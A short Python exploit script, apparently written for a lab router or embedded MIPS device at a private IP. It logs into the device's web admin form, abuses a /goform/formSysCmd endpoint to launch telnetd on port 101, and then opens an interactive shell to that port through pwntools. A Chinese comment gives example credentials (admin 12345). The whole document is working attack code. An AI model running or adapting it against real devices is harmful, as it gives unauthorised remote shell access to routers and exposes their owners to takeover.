import requests
import sys
import struct
import base64
from pwn import *
context(arch='mips',endian='big',log_level='debug')

ip='192.168.84.129'
port=101
def login(user,password):
    postData = {
    'login_name':'',
    'curTime':'1234',
    'FILECODE':'',
    'VER_CODE':'',
    'VERIFICATION_CODE':'',
    'login_n':user,
    'login_pass':base64.b64encode(password),
    }
    response = requests.post('http://'+ip+'/goform/formLogin',data=postData)
    #print response.url
def syscmd(cmd):
    postData = {
    'sysCmd':cmd,
    'submit-url':'1234',
    }
    response = requests.post('http://'+ip+'/goform/formSysCmd',data=postData)
    #print response.url
def inter():
    p=remote(ip,port)
    p.interactive()
if __name__ == "__main__":
    login('','')#这里要写实际的用户名和密码，例如admin 12345
    syscmd('telnetd -p '+str(port))
    inter()